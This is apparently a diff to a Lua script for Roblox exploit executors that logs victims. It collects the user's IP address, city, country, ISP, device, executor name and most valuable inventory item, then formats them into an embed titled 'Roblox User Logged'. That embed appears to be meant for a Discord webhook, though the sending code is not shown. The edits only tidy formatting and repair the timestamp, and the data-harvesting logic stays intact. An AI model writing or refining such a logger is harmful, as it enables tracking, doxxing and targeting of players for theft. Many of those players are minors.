@@ -54,10 +54,8 @@ end)
 
 local hwid = "N/A"
 pcall(function()
-    if identifyexecutor then
-        hwid = identifyexecutor()
-    elseif getexecutorname then
-        hwid = getexecutorname()
+    if identifyexecutor then hwid = identifyexecutor()
+    elseif getexecutorname then hwid = getexecutorname()
     end
 end)
 
@@ -69,29 +67,28 @@ end)
 local avatar = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)
 local profile = string.format("https://www.roblox.com/users/%d/profile", userId)
 
+local isoTime = os.date("!%Y-%m-%dT%H:%M:%SZ")  -- UTC ISO-8601
+
 local embed = {{
     author = {
-        name = display .. " (@ " .. name .. ")",
+        name = display .. " (@" .. name .. ")",
         url = profile,
         icon_url = avatar
     },
     title = "Roblox User Logged",
-    description = 
+    description =
         "**Account Age:** `" .. age .. "`\n" ..
         "**Valuable Item:** `" .. best.name .. "`\n" ..
         "**RAP:** `" .. (best.rap > 0 and tostring(best.rap) or "N/A") .. "` | **Value:** `" .. (best.value > 0 and tostring(best.value) or "N/A") .. "`\n\n" ..
-        "**IP Address:** `" .. ip .. "`\n" ..
+        "**IP:** `" .. ip .. "`\n" ..
         "**Location:** `" .. geo.city .. ", " .. geo.country .. "`\n" ..
         "**ISP:** `" .. geo.isp .. "`\n\n" ..
         "**HWID:** `" .. hwid .. "`\n" ..
         "**Device:** `" .. device .. "`",
     thumbnail = {url = avatar},
     color = 0x00ff88,
-    footer = {
-        text = "Profile • " .. os.date("%Y-%m-%d %H:%M:%S"),
-        icon_url = "https://cdn.discordapp.com/emojis/1051871862893834240.png"
-    },
-    timestamp = HttpService:GenerateGUID(false)
+    footer = {text = "Profile • " .. os.date("%Y-%m-%d %H:%M:%S")},
+    timestamp = isoTime
 }}
 
 local payload = {
